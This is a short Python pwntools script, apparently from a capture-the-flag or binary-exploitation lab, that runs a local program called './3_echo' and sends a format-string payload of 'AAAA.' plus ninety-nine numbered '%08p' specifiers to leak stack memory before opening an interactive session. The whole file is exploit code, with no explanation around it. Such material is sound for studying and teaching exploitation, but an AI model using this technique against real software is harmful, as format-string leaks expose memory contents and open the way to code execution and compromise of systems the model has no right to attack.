#!/usr/bin/python

from pwn import * 

def main():
	p = process("./3_echo")

	count = 1 
	limit = 100
	payload = "AAAA." 
	while (count < limit):
		payload += str(count) + " %08p "
		count = count + 1
		

	p.sendline(payload)
	p.recvrepeat(0.2)
	p.sendline("1")

	p.interactive()


if __name__ == "__main__":
	main()
